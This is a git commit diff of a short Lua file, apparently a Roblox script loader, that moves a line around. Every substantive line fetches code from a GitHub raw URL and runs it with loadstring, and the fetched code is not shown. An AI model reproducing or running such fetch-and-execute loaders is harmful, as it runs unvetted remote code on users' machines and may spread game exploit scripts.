da0c234ed74b9431766bdaace93bd77b9c2a5042
tozxart <113105816+lifaiossama@users.noreply.github.com>
2022-09-13 00:01:14 +0100

    Update errors2.lua

--- errors2.lua
+++ errors2.lua
@@ -1,6 +1,8 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lifaiossama/errors/main/errors.lua"))()
-
 shared.key = "ToZx"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Poopland/Alpha/Loader/Alphabit.luarin"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lifaiossama/errors/main/errors.lua"))()
+
+
 
